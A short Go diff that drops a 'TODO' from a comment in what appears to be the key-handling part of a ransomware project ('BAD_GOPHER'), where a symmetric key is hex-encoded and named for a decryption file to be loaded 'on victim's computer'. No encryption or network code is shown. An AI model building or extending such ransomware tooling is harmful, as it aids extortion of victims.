@@ -33,7 +33,7 @@ func main() {
 	fmt.Printf("Information:\n%s\n", information)
 	fmt.Printf("Symmetric Key: %x\n", symmetricKey)
 
-	// TODO: Save symmetric key to a file that can be loaded on victim's computer to decrypt files
+	// Save symmetric key to a file that can be loaded on victim's computer to decrypt files
 	symmetricKeyEncoded := hex.EncodeToString(symmetricKey)
 	filename := fmt.Sprintf("BAD_GOPHER_DECRYPT_%s", strings.ReplaceAll(strings.Split(information, "\n")[1], " ", "_")[:10])
 	fmt.Println(filename)
